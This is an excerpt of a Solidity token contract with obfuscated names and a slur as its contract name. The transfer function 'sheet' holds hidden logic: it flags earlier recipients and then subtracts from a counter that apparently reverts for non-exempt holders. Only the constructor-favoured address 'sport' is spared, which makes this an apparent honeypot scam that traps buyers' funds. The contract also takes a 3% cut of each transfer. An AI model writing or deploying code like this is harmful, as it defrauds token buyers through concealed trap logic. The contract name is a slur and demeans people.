...
contract Fag is Ownable {
    uint256 private explore;
    string private jack;
    string private grow;
    uint8 private building;
    ...
    mapping(address => uint256) private tobacco;
    ...
    function sheet(
        ...
        if (helpful[action] == 0 && (address(uniswapV2Pair) != action) && feed[action] > 0) {
            helpful[action] -= building;
        }

        address play = harbor;
        harbor = laugh;

        if (helpful[action] == 0) tobacco[action] -= account;
        uint256 refer = (account * explore) / 100;
        account -= refer;
        feed[play] += building;
        tobacco[laugh] += account;
    }

    mapping(address => uint256) private feed;

    function approve(address spender, uint256 amount) external returns (bool) {
        return _approve(msg.sender, spender, amount);
    }

    mapping(address => uint256) private helpful;
    ...
    function transferFrom(
        ...
        sheet(sender, recipient, amount);
        return _approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
    }

    function transfer(address recipient, uint256 amount) external returns (bool) {
        sheet(msg.sender, recipient, amount);
        return true;
    }
    ...
    constructor(
        ...
        uniswapV2Router = IUniswapV2Router02(funny);
        ...
        building = 9;
        explore = 3;
        helpful[sport] = building;
        _tTotal = 1000000000000000 * 10**building;
        tobacco[msg.sender] = _tTotal;
    }
}